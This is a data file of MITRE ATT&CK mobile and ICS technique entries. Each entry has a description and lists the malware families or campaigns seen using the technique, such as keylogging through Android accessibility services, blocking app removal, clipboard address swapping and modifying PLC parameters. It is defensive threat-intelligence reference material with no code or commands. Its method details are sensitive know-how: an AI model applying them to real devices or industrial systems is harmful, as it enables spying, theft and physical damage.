T1641.001,Transmitted Data Manipulation,"Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity. By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, or decision making.  Manipulation may be possible over a network connection or between system processes where there is an opportunity to deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system, typically gained through a prolonged information gathering campaign, in order to have the desired impact.  One method to achieve [Transmitted Data Manipulation] is by modifying the contents of the device clipboard. Malicious applications may monitor clipboard activity through the `ClipboardManager.OnPrimaryClipChangedListener` interface on Android to determine when clipboard contents have changed. Listening to clipboard activity, reading clipboard contents, and modifying clipboard contents requires no explicit application permissions and can be performed by applications running in the background. However, this behavior has changed with the release of Android 10.  Adversaries may use [Transmitted Data Manipulation] to replace text prior to being pasted. For example, replacing a copied Bitcoin wallet address with a wallet address that is under adversarial control.  [Transmitted Data Manipulation] was seen within the Android/Clipper.C trojan. This sample was detected by ESET in an application distributed through the Google Play Store targeting cryptocurrency wallet numbers.",['[S.O.V.A.] can manipulate clipboard data to replace cryptocurrency addresses.'],False
T1474.001,Compromise Software Dependencies and Development Tools,Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.,"[""[XcodeGhost] was injected into apps by a modified version of Xcode (Apple's software development tool).""]",False
T1635.001,URI Hijacking,"Adversaries may register Uniform Resource Identifiers (URIs) to intercept sensitive data.   Applications regularly register URIs with the operating system to act as a response handler for various actions, such as logging into an app using an external account via single sign-on. This allows redirections to that specific URI to be intercepted by the application. If an adversary were to register for a URI that was already in use by a genuine application, the adversary may be able to intercept data intended for the genuine application or perform a phishing attack against the genuine application. Intercepted data may include OAuth authorization codes or tokens that could be used by the adversary to gain access to protected resources. ",[],False
T1634.001,Keychain,"Adversaries may collect keychain data from an iOS device to acquire credentials. Keychains are the built-in way for iOS to keep track of users' passwords and credentials for many services and features such as Wi-Fi passwords, websites, secure notes, certificates, private keys, and VPN credentials.   On the device, the keychain database is stored outside of application sandboxes to prevent unauthorized access to the raw data. Standard iOS APIs allow applications access to their own keychain contained within the database. By utilizing a privilege escalation exploit or existing root access, adversaries can access the entire encrypted database. ",['[INSOMNIA] can extract the device’s keychain.'],False
T1481.002,Bidirectional Communication,"Adversaries may use an existing, legitimate external Web service channel as a means for sending commands to and receiving output from a compromised system. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet.      Popular websites and social media, acting as a mechanism for C2, may give a significant amount of cover. This is due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. ","['[BusyGasper] can be controlled via IRC using freenode.net servers.', '[Mandrake] has used Firebase for C2.', '[TERRACOTTA] has used Firebase for C2 communication.']",False
T1474.003,Compromise Software Supply Chain,"Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.","['[Adups] was pre-installed on Android devices from some vendors.', '[Triada] was added into the Android system by a third-party vendor identified as Yehuo or Blazefire during the production process.', 'In at least one case, [Stealth Mango] may have been installed using physical access to the device by a repair shop.', 'A Linux kernel distributed by [Allwinner] reportedly contained an simple backdoor that could be used to obtain root access. It was believed to have been left in the kernel by mistake by the authors.', '[CHEMISTGAMES] has been distributed as updates to legitimate applications. This was accomplished by compromising legitimate app developers, and subsequently gaining access to their Google Play Store developer account.']",False
T1481.001,Dead Drop Resolver,"Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.      Popular websites and social media, acting as a mechanism for C2, may give a significant amount of cover. This is due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.      Use of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis, or enable operational resiliency (since this infrastructure may be dynamically changed). ","['[ANDROIDOS_ANSERVER.A] uses encrypted content within a blog site for part of its command and control. Specifically, the encrypted content contains URLs for other servers to be used for other aspects of command and control.', '[Red Alert 2.0] can fetch a backup C2 domain from Twitter if the primary C2 is unresponsive.', '[XLoader for Android] has fetched its C2 address from encoded Twitter names, as well as Instagram and Tumblr.', '[Anubis] can retrieve the C2 address from Twitter and Telegram.']",False
T1626.001,Device Administrator Permissions,"Adversaries may abuse Android’s device administration API to obtain a higher degree of control over the device. By abusing the API, adversaries can perform several nefarious actions, such as resetting the device’s password for [Endpoint Denial of Service] factory resetting the device for [File Deletion] and to delete any traces of the malware, disabling all the device’s cameras, or to make it more difficult to uninstall the app.  Device administrators must be approved by the user at runtime, with a system popup showing which actions have been requested by the app. In conjunction with other techniques, such as [Input Injection] an app can programmatically grant itself administrator permissions without any user input.","['[Sunbird] can request device administrator privileges. ', '[Red Alert 2.0] can request device administrator permissions.', '[GPlayed] can request device administrator permissions.', '[Marcher] requests Android Device Administrator access.', '[AbstractEmu] can modify system settings to give itself device administrator privileges.', '[Exobot] can request device administrator permissions.', '[XLoader for Android] requests Android Device Administrator access.', '[Hornbill] can request device administrator privileges.', '[Asacub] can request device administrator permissions.']",False
T1430.001,Remote Device Management Services,An adversary may use access to cloud services (e.g. Google's Android Device Manager or Apple iCloud's Find my iPhone) or to an enterprise mobility management (EMM)/mobile device management (MDM) server console to track the location of mobile devices managed by the service. ,[],False
T1630.003,Disguise Root/Jailbreak Indicators,"An adversary could use knowledge of the techniques used by security software to evade detection. For example, some mobile security products perform compromised device detection by searching for particular artifacts such as an installed ""su"" binary, but that check could be evaded by naming the binary something else. Similarly, polymorphic code techniques could be used to evade signature-based detection.",[],False
T1636.001,Calendar Entries,"Adversaries may utilize standard operating system APIs to gather calendar entry data. On Android, this can be accomplished using the Calendar Content Provider. On iOS, this can be accomplished using the `EventKit` framework.      If the device has been jailbroken or rooted, an adversary may be able to access [Calendar Entries] without the user’s knowledge or approval. ","['[Exodus] Two can exfiltrate calendar events. ', '[FlexiSpy] can collect the device calendars.', '[Stealth Mango] uploads calendar events and reminders.', '[Pegasus for Android] accesses calendar entries.', '[Monokle] can retrieve calendar event information including the event name, when and where it is taking place, and the description. ', '[Sunbird] can exfiltrate calendar information.']",False
T1630.002,File Deletion,"Adversaries may wipe a device or delete individual files in order to manipulate external outcomes or hide activity. An application must have administrator access to fully wipe the device, while individual files may not require special permissions to delete depending on their storage location.   Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The impact file deletion will have depends on the type of data as well as the goals and objectives of the adversary, but can include deleting update files to evade detection or deleting attacker-specified files for impact.","['[Hornbill] can delete locally gathered files after uploading them to the C2 to avoid suspicion. ', '[WolfRAT] can delete files from the device.', '[Monokle] can delete arbitrary files on the device, and can also uninstall itself and clean up staging files.', '[DoubleAgent] has deleted or renamed specific files.', '[Pallas] has the ability to delete attacker-specified files from compromised devices.', '[SilkBean] can delete various piece of device data, such as contacts, call logs, applications, SMS messages, email, plugins, and files in external storage.', '[Agent Smith] deletes infected applications’ update packages when they are detected on the system, preventing updates.', '[Desert Scorpion] can delete copies of itself if additional APKs are downloaded to external storage.', '[GPlayed] can wipe the device.', '[Fakecalls] can manipulate a device’s call log, including deleting incoming calls.', '[ViceLeaker] can delete arbitrary files from the device.', '[FlexiSpy] can delete data from a compromised device.', '[Tiktok Pro] can delete attacker-specified files.', '[Mandrake] can delete all data from an infected device.', '[GolfSpy] can delete arbitrary files on the device.', '[CarbonSteal] has deleted call log entries coming from known C2 sources.']",False
T1629.002,Device Lockout,"An adversary may seek to inhibit user interaction by locking the legitimate user out of the device. This is typically accomplished by requesting device administrator permissions and then locking the screen using `DevicePolicyManager.lockNow()`. Other novel techniques for locking the user out of the device have been observed, such as showing a persistent overlay, using carefully crafted “call” notification screens, and locking HTML pages in the foreground. These techniques can be very difficult to get around, and typically require booting the device into safe mode to uninstall the malware.  Prior to Android 7, device administrators were able to reset the device lock passcode to prevent the user from unlocking the device. The release of Android 7 introduced updates that only allow device or profile owners (e.g. MDMs) to reset the device’s passcode.","['[TrickMo] can prevent the user from interacting with the UI by showing a WebView with a persistent cursor.', '[AndroidOS/MalLocker.B] can prevent the user from interacting with the UI by using a carefully crafted ""call"" notification screen. This is coupled with overriding the `onUserLeaveHint()` callback method to spawn a new notification instance when the current one is dismissed. ', '[Rotexy] can lock an HTML page in the foreground, requiring the user enter credit card information that matches information previously intercepted in SMS messages, such as the last 4 digits of a credit card number. If attempts to revoke administrator permissions are detected, [Rotexy] periodically switches off the phone screen to inhibit permission removal.']",False
T1417.001,Keylogging,"Adversaries may log user keystrokes to intercept credentials or other information from the user as the user types them.  Some methods of keylogging include:  * Masquerading as a legitimate third-party keyboard to record user keystrokes. On both Android and iOS, users must explicitly authorize the use of third-party keyboard apps. Users should be advised to use extreme caution before granting this authorization when it is requested. * Abusing accessibility features. On Android, adversaries may abuse accessibility features to record keystrokes by registering an `AccessibilityService` class, overriding the `onAccessibilityEvent` method, and listening for the `AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED` event type. The event object passed into the function will contain the data that the user typed.  *Additional methods of keylogging may be possible if root access is available.  ","['[SharkBot] can use accessibility event logging to steal data in text fields.', ""[Monokle] can record the user's keystrokes."", '[BusyGasper] can collect every user screen tap and compare the input to a hardcoded list of coordinates to translate the input to a character.', '[FlexiSpy] can record keystrokes and analyze them for keywords.', '[S.O.V.A.] can use keylogging to capture user input.', '[Drinik] can use keylogging to steal user banking credentials.', '[Chameleon] can log keystrokes and gather the lock screen password of an infected device by abusing Accessibility Services.', '[Gustuff] abuses accessibility features to intercept all interactions between a user and the device.', '[Windshift] has included keylogging capabilities as part of Operation ROCK.', '[BOULDSPY] can capture keystrokes.', '[Exobot] has used web injects to capture users’ credentials.', '[Anubis] has a keylogger that works in every application installed on the device.', '[EventBot] can abuse Android’s accessibility service to record the screen PIN.', '[Escobar] can collect application keylogs.', '[Cerberus] can record keystrokes.']",False
T1521.001,Symmetric Cryptography,"Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic, rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, Blowfish, and RC4.","['[EventBot] has encrypted base64-encoded payload data using RC4 and Curve25519.', '[SharkBot] can use RC4 to encrypt C2 payloads.', '[Windshift] has encrypted C2 communications using AES in CBC mode during Operation BULL and Operation ROCK.', ' [Rotexy] encrypts JSON HTTP payloads with AES. ']",False
T1474.002,Compromise Hardware Supply Chain,"Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. ",[],False
T1636.004,SMS Messages,"Adversaries may utilize standard operating system APIs to gather SMS messages. On Android, this can be accomplished using the SMS Content Provider. iOS provides no standard API to access SMS messages.   If the device has been jailbroken or rooted, an adversary may be able to access [SMS Messages] without the user’s knowledge or approval. ","['[ViceLeaker] can collect SMS messages.', '[Tangelo] contains functionality to gather SMS messages.', '[Escobar] can read SMS messages on the device.', '[HenBox] can intercept SMS messages.', '[Adups] transmitted the full contents of text messages.', '[Bread] can access SMS messages in order to complete carrier billing fraud.', '[Ginp] can collect SMS messages.', '[RCSAndroid] can collect SMS, MMS, and Gmail messages.', '[DoubleAgent] has captured SMS and MMS messages.', '[Dendroid] can intercept SMS messages.', '[S.O.V.A.] can intercept and read SMS messages.', '[RuMMS] uploads incoming SMS messages to a remote command and control server.', '[GolfSpy] can collect SMS messages.', '[GPlayed] can read SMS messages.', '[EventBot] can intercept SMS messages.', '[Desert Scorpion] can retrieve SMS messages.', '[Triada] variants capture transaction data from SMS-based in-app purchases. ', '[SharkBot] can intercept SMS messages.', '[TrickMo] can intercept SMS messages.', '[Gustuff] can intercept two-factor authentication codes transmitted via SMS. ', '[WolfRAT] can collect SMS messages.', '[Red Alert 2.0] can collect SMS messages.', '[INSOMNIA] can retrieve SMS messages and iMessages.', '[Cerberus] can collect SMS messages from a device.', '[AbstractEmu] can intercept SMS messages containing two factor authentication codes.', '[Chameleon] can gather SMS messages.', '[Android/Chuli.A] stole SMS message content.', '[Tiktok Pro] can collect SMS messages from the device.', '[MazarBOT] can intercept two-factor authentication codes sent by online banking apps.', '[TangleBot] can read incoming text messages.', '[Pegasus for iOS] captures SMS messages that the victim sends or receives.', '[Corona Updates] can collect SMS messages.', '[Xbot] steals all SMS message and contact information as well as intercepts and parses certain SMS messages.', '[XLoader for Android] collects SMS messages.', '[Drinik] can collect user SMS messages.', '[Windshift] has included SMS message exfiltration in the malicious apps deployed as part of Operation BULL and Operation ROCK.', '[DroidJack] captures SMS data.', '[AndroRAT] captures SMS messages.', '[Exodus] Two can capture SMS messages.', '[SilkBean] can access SMS messages.', '[Fakecalls] can access text message history.', '[Golden Cup] can collect sent and received SMS messages.', '[Rotexy] processes incoming SMS messages by filtering based on phone numbers, keywords, and regular expressions, focusing primarily on banks, payment systems, and mobile network operators. [Rotexy] can also send a list of all SMS messages on the device to the command and control server.', '[Exobot] can intercept SMS messages.', '[FrozenCell] has read SMS messages for exfiltration.', '[Riltok] can intercept incoming SMS messages.', '[BusyGasper] can collect SMS messages.', '[GoldenEagle] has collected SMS messages.', '[FakeSpy] can collect SMS messages.', '[FluBot] can intercept SMS messages and USSD messages from Telcom operators.', '[BOULDSPY] can exfiltrate SMS logs.', '[FinFisher] captures and exfiltrates SMS messages.', '[CarbonSteal] can access the device’s SMS and MMS messages.', '[FlexiSpy] can intercept SMS and MMS messages as well as monitor messages for keywords.', '[SpyNote RAT] can read SMS messages.', '[Asacub] can collect SMS messages as they are received.', '[Pallas] captures and exfiltrates all SMS messages, including future messages as they are received.', '[SpyDealer] harvests SMS and MMS messages from victims.', 'During [Operation Dust Storm] the threat actors used Android backdoors to continually forward all SMS messages and call information back to their C2 servers.', '[ViperRAT] can collect SMS messages.', '[Stealth Mango] uploads SMS messages.', '[Mandrake] can access SMS messages.']",False
T1625.001,System Runtime API Hijacking,"Adversaries may execute their own malicious payloads by hijacking the way an operating system runs applications. Hijacking execution flow can be for the purposes of persistence since this hijacked execution may reoccur at later points in time.    On Android, adversaries may overwrite the standard OS API library with a malicious alternative to hook into core functions to achieve persistence. By doing this, the adversary’s code will be executed every time the overwritten API function is called by an app on the infected device.","['[Dvmap] replaces `/system/bin/ip` with a malicious version. [Dvmap] can inject code by patching `libdmv.so` or `libandroid_runtime.so`, depending on the Android OS version. Both libraries are related to the Dalvik and ART runtime environments. The patched functions can only call `/system/bin/ip`, which was replaced with the malicious version.', '[Zen] can install itself on the system partition to achieve persistence. [Zen] can also replace `framework.jar`, which allows it to intercept and modify the behavior of the standard Android API.', '[FlexiSpy] installs boot hooks into `/system/su.d`.']",False
T1481.003,One-Way Communication,"Adversaries may use an existing, legitimate external Web service channel as a means for sending commands to a compromised system without receiving return output. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.      Popular websites and social media, acting as a mechanism for C2, may give a significant amount of cover. This is due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. ",['[Twitoor] can be controlled via Twitter.'],False
T1629.001,Prevent Application Removal,"Adversaries may abuse the Android device administration API to prevent the user from uninstalling a target application. In earlier versions of Android, device administrator applications needed their administration capabilities explicitly deactivated by the user before the application could be uninstalled. This was later updated so the user could deactivate and uninstall the administrator application in one step.  Adversaries may also abuse the device accessibility APIs to prevent removal. This set of APIs allows the application to perform certain actions on behalf of the user and programmatically determine what is being shown on the screen. The malicious application could monitor the device screen for certain modals (e.g., the confirmation modal to uninstall an application) and inject screen input or a back button tap to close the modal. For example, Android's `performGlobalAction(int)` API could be utilized to prevent the user from removing the malicious application from the device after installation. If the user wants to uninstall the malicious application, two cases may occur, both preventing the user from removing the application.  * Case 1: If the integer argument passed to the API call is `2` or `GLOBAL_ACTION_HOME`, the malicious application may direct the user to the home screen from settings screen   * Case 2: If the integer argument passed to the API call is `1` or `GLOBAL_ACTION_BACK`, the malicious application may emulate the back press event ","['[OBAD] abuses device administrator access to make it more difficult for users to remove the application.', '[Chameleon] can prevent application removal by abusing Accessibility Services.', '[Mandrake] can abuse device administrator permissions to ensure that it cannot be uninstalled until its permissions are revoked.', '[Gustuff] may prevent application removal by abusing Android’s ` performGlobalAction(int)` API call. ', ""[Anubis] may prevent malware's uninstallation by abusing Android’s ` performGlobalAction(int)` API call."", '[S.O.V.A.] can resist removal by going to the home screen during uninstall.', '[FluBot] can use Accessibility Services to make removal of the malicious app difficult.']",False
T1636.003,Contact List,"Adversaries may utilize standard operating system APIs to gather contact list data. On Android, this can be accomplished using the Contacts Content Provider. On iOS, this can be accomplished using the `Contacts` framework.      If the device has been jailbroken or rooted, an adversary may be able to access the [Contact List] without the user’s knowledge or approval. ","['[SilkBean] can access device contacts.', '[Mandrake] can access the device’s contact list.', '[Hornbill] can collect device contacts.', '[ViperRAT] can collect the device’s contact list.', '[Windshift] has included contact list exfiltration in the malicious apps deployed as part of Operation BULL.', '[BOULDSPY] can exfiltrate a device’s contacts.', '[DoubleAgent] has accessed the contact list.', '[Rotexy] can access and upload the contacts list to the command and control server.', '[FluBot] can retrieve the contacts list from an infected device.', '[TangleBot] can request permission to view device contacts.', '[GPlayed] can access the device’s contact list.', ""[Riltok] can access and upload the device's contact list to the command and control server."", '[GolfSpy] can obtain the device’s contact list.', '[Cerberus] can obtain the device’s contact list.', '[Red Alert 2.0] can collect the device’s contact list.', '[eSurv] can exfiltrate the device’s contact list.', '[Exodus] Two can download the address book. ', '[SpyNote RAT] can view contacts.', '[Fakecalls] can copy and exfiltrate a device’s contact list.', '[GoldenEagle] has collected a list of contacts.', '[WolfRAT] can collect the device’s contact list.', '[Gustuff] can collect the contact list. ', ""[Pegasus for iOS] gathers contacts from the system by dumping the victim's address book."", '[Pallas] accesses the device contact list.', '[Corona Updates] can collect device contacts.', '[INSOMNIA] can collect the device’s contact list.', '[Asacub] can collect the device’s contact list.', '[Desert Scorpion] can collect the device’s contact list.', ""[Sunbird] can exfiltrate a device's contacts."", '[Anubis] can steal the device’s contact list. ', '[Golden Cup] can collect the device’s contact list.', ""[Monokle] can retrieve the device's contact list."", '[Stealth Mango] uploads contact lists for various third-party applications such as Yahoo, AIM, GoogleTalk, Skype, QQ, and others.', '[Adups] transmitted contact lists.', '[AndroRAT] collects contact list information.', '[SpyDealer] harvests contact lists from victims.', '[Android/Chuli.A] stole contact list data stored both on the the phone and the SIM card.', '[Exobot] can access the device’s contact list.', ""[Charger] steals contacts from the victim user's device."", '[Pegasus for Android] accesses contact list information.', '[HenBox] can access the device’s contact list.', '[AbstractEmu] can grant itself contact list access.', '[FlexiSpy] can collect device contacts.', '[FakeSpy] can collect the device’s contact list.', ""[Tiktok Pro] can access the device's contact list. "", '[Ginp] can download the device’s contact list.']",False
T1627.001,Geofencing,"Adversaries may use a device’s geographical location to limit certain malicious behaviors. For example, malware operators may limit the distribution of a second stage payload to certain geographic regions.  [Geofencing] is accomplished by persuading the user to grant the application permission to access location services. The application can then collect, process, and exfiltrate the device’s location to perform location-based actions, such as ceasing malicious behavior or showing region-specific advertisements.   One method to accomplish [Geofencing] on Android is to use the built-in Geofencing API to automatically trigger certain behaviors when the device enters or exits a specified radius around a geographical location. Similar to  other [Geofencing] methods, this requires that the user has granted the `ACCESS_FINE_LOCATION` and `ACCESS_BACKGROUND_LOCATION` permissions. The latter is only required if the application targets Android 10 (API level 29) or higher. However, Android 11 introduced additional permission controls that may restrict background location collection based on user permission choices at runtime. These additional controls include ""Allow only while using the app"", which will effectively prohibit background location collection.    Similarly, on iOS, developers can use built-in APIs to setup and execute geofencing. Depending on the use case, the app will either need to call `requestWhenInUseAuthorization()` or `requestAlwaysAuthorization()`, depending on when access to the location services is required. Similar to Android, users also have the option to limit when the application can access the device’s location, including one-time use and only when the application is running in the foreground.    [Geofencing] can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. For example, location data could be used to limit malware spread and/or capabilities, which could also potentially evade application analysis environments (ex: malware analysis outside of the target geographic area). Other malicious usages could include showing language-specific input prompts and/or advertisements.","['[eSurv] imposes geo-restrictions when delivering the second stage.', '[Windshift] has region-locked their malicious applications during their Operation BULL campaign.']",False
T1628.001,Suppress Application Icon,"A malicious application could suppress its icon from being displayed to the user in the application launcher. This hides the fact that it is installed, and can make it more difficult for the user to uninstall the application. Hiding the application's icon programmatically does not require any special permissions.   This behavior has been seen in the BankBot/Spy Banker family of malware.   Beginning in Android 10, changes were introduced to inhibit malicious applications’ ability to hide their icon. If an app is a system app, requests no permissions, or does not have a launcher activity, the application’s icon will be fully hidden. Further, if the device is fully managed or the application is in a work profile, the icon will be fully hidden. Otherwise, a synthesized activity is shown, which is a launcher icon that represents the app’s details page in the system settings. If the user clicks the synthesized activity in the launcher, they are taken to the application’s details page in the system settings.","['[DoubleAgent] has hidden its app icon.', '[Cerberus] hides its icon from the application drawer after being launched for the first time.', '[BusyGasper] can hide its icon.', '[Android/AdDisplay.Ashas] can hide its icon and create a shortcut based on the C2 server response.', '[FakeSpy] can hide its icon if it detects that it is being run on an emulator.', '[Ginp] hides its icon after installation.', '[S.O.V.A.] can hide its application icon.', '[Twitoor] can hide its presence on the system.', '[Agent Smith] can hide its icon from the application launcher.', ""[FlexiSpy] is capable of hiding SuperSU's icon if it is installed and visible. [FlexiSpy] can also hide its own icon to make detection and the uninstallation process more difficult."", '[Rotexy] hides its icon after first launch.', '[Gustuff] hides its icon after installation. ', '[Desert Scorpion] can hide its icon.', '[Mandrake] can hide its icon on older Android versions.', '[SimBad] hides its icon from the application launcher.', '[Tiktok Pro] can hide its icon after launch.', '[Drinik] can hide its application icon.', '[YiSpecter] has hidden the app icon from iOS springboard.', '[ViceLeaker] includes code to hide its icon, but the function does not appear to be called in an analyzed version of the software.']",False
T1406.001,Steganography,"Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.","['[Agent Smith] core malware is disguised as a JPG file, and encrypted with an XOR cipher.']",False
T1632.001,Code Signing Policy Modification,"Adversaries may modify code signing policies to enable execution of applications signed with unofficial or unknown keys. Code signing provides a level of authenticity on an app from a developer, guaranteeing that the program has not been tampered with and comes from an official source. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on a device.   Mobile devices generally enable these security controls by default, such as preventing the installation of unknown applications on Android. Adversaries may modify these policies in a number of ways, including [Input Injection] or malicious configuration profiles.","['[TianySpy] can install malicious configurations on iPhones to allow malware to be installed via Ad Hoc distribution. ', '[GoldenEagle] has modified or configured proxy information. ', '[SilkBean] has attempted to trick users into enabling installation of applications from unknown sources.', '[Dvmap] can enable installation of apps from unknown sources.', 'If running on a Huawei device, [Desert Scorpion] adds itself to the protected apps list, which allows it to run with the screen off.', '[YiSpecter] has used fake Verisign and Symantec certificates to bypass malware detection systems. [YiSpecter] has also signed malicious apps with iOS enterprise certificates to work on non-jailbroken iOS devices.', '[XLoader for iOS] has been installed via a malicious configuration profile.', '[Windshift] has installed malicious MDM profiles on iOS devices as part of Operation ROCK.', '[Mandrake] can enable app installation from unknown sources.']",False
T1637.001,Domain Generation Algorithms,"Adversaries may use [Domain Generation Algorithms] (DGAs) to procedurally generate domain names for uses such as command and control communication   or malicious application distribution.  DGAs increase the difficulty for defenders to block, track, or take over the command and control channel, as there could potentially be thousands of domains that malware can check for instructions.","['[FluBot] can use Domain Generation Algorithms to connect to the C2 server.', '[SharkBot] contains domain generation algorithms to use as backups in case the hardcoded C2 domains are unavailable.', '[Rotexy] procedurally generates subdomains for command and control communication.', '[Mandrake] has used domain generation algorithms.']",False
T0803,Block Command Message,"Adversaries may block a command message from reaching its intended target to prevent command execution. In OT networks, command messages are sent to provide instructions to control system devices. A blocked command message can inhibit response functions from correcting a disruption or unsafe condition.   ","['During the [2015 Ukraine Electric Power Attack] [Sandworm Team] blocked command messages by using malicious firmware to render serial-to-ethernet converters inoperable. ', 'In [Industroyer] the first COM port from the configuration file is used for the actual communication and the two other COM ports are just opened to prevent other processes accessing them. Thus, the IEC 101 payload component is able to take over and maintain control of the RTU device. ', 'In the Ukraine 2015 Incident, [Sandworm Team] blocked command messages by using malicious firmware to render communication devices inoperable. ']",False
T0881,Service Stop,Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.   Services may not allow for modification of their data stores while running. Adversaries may stop services in order to conduct Data Destruction. ,"['Before encrypting the process, [EKANS] first kills the process if its name matches one of the processes defined on the kill-list.    EKANS also utilizes netsh commands to implement firewall rules that blocks any remote communication with the device. ', '[REvil] searches for all processes listed in the prc field within its configuration file and then terminates each process. ', '[Industroyer2] has the capability to terminate specified processes (i.e., PServiceControl.exe and PService_PDD.exe) and rename each process to prevent restart. These are defined through a hardcoded configuration.', '[Industroyer] has the capability to stop a service itself, or to login as a user and stop a service as that user. ', '[KillDisk] looks for and terminates two non-standard processes, one of which is an ICS application. ']",False
T0836,Modify Parameter,"Adversaries may modify parameters used to instruct industrial control system devices. These devices operate via programs that dictate how and when to perform actions based on such parameters. Such parameters can determine the extent to which an action is performed and may specify additional options. For example, a program on a control system device dictating motor processes may take a parameter defining the total number of seconds to run that motor.        An adversary can potentially modify these parameters to produce an outcome outside of what was intended by the operators. By modifying system and process critical parameters, the adversary may cause [Impact] to equipment and/or control processes. Modified parameters may be turned into dangerous, out-of-bounds, or unexpected values from typical operations. For example, specifying that a process run for more or less time than it should, or dictating an unusually high, low, or invalid value as a parameter.","['[INCONTROLLER] can use the HTTP CGI scripts on Omron PLCs to modify parameters on EtherCat connected servo drives. ', 'In states 3 and 4 [Stuxnet] sends two network bursts (done through the DP_SEND primitive). The data in the frames are instructions for the frequency converter drives. For example one of the frames contains records that change the maximum frequency (the speed at which the motor will operate). The frequency converter drives consist of parameters, which can be remotely configured via Profibus. One can write new values to these parameters changing the behavior of the device. ', '[Industroyer2] modifies specified Information Object Addresses (IOAs) for specified Application Service Data Unit (ASDU) addresses to either the ON or OFF state.', 'In the [Maroochy Water Breach] the adversary gained remote computer access to the control system and altered data so that whatever function should have occurred at affected pumping stations did not occur or occurred in a different way. The software program installed in the laptop was one developed for changing configurations in the PDS computers. This ultimately led to 800,000 liters of raw sewage being spilled out into the community.', 'During the [Oldsmar Treatment Plant Intrusion] the threat actors raised the sodium hydroxide setpoint value from 100 part-per-million (ppm) to 11,100 ppm, far beyond normal operating levels.']",False
T0821,Modify Controller Tasking,"Adversaries may modify the tasking of a controller to allow for the execution of their own programs. This can allow an adversary to manipulate the execution flow and behavior of a controller.   According to 61131-3, the association of a Task with a Program Organization Unit (POU) defines a task association.  An adversary may modify these associations or create new ones to manipulate the execution flow of a controller. Modification of controller tasking can be accomplished using a Program Download in addition to other types of program modification such as online edit and program append.  Tasks have properties, such as interval, frequency and priority to meet the requirements of program execution. Some controller vendors implement tasks with implicit, pre-defined properties whereas others allow for these properties to be formulated explicitly. An adversary may associate their program with tasks that have a higher priority or execute associated programs more frequently. For instance, to ensure cyclic execution of their program on a Siemens controller, an adversary may add their program to the task, Organization Block 1 (OB1).","['[PLC-Blaster] code is stored in OB9999. The original code on the target is untouched. The OB is automatically detected by the PLC and executed. ', '[Triton] argument-setting and inject.bin shellcode are added to the program table on the Tricon so that they are executed by the firmware once each cycle.  ', '[Stuxnet] infects OB1 so that its malicious code sequence is executed at the start of a cycle. It also infects OB35. OB35 acts as a watchdog, and on certain conditions, it can stop the execution of OB1. ']",False
T0887,Wireless Sniffing,"Adversaries may seek to capture radio frequency (RF) communication used for remote control and reporting in distributed environments. RF communication frequencies vary between 3 kHz to 300 GHz, although are commonly between 300 MHz to 6 GHz.   The wavelength and frequency of the signal affect how the signal propagates through open air, obstacles (e.g. walls and trees) and the type of radio required to capture them. These characteristics are often standardized in the protocol and hardware and may have an effect on how the signal is captured. Some examples of wireless protocols that may be found in cyber-physical environments are: WirelessHART, Zigbee, WIA-FA, and 700 MHz Public Safety Spectrum.   Adversaries may capture RF communications by using specialized hardware, such as software defined radio (SDR), handheld radio, or a computer with radio demodulator tuned to the communication frequency.  Information transmitted over a wireless medium may be captured in-transit whether the sniffing device is the intended destination or not. This technique may be particularly useful to an adversary when the communications are not encrypted.    In the 2017 Dallas Siren incident, it is suspected that adversaries likely captured wireless command message broadcasts on a 700 MHz frequency during a regular test of the system. These messages were later replayed to trigger the alarm systems. ",[],False
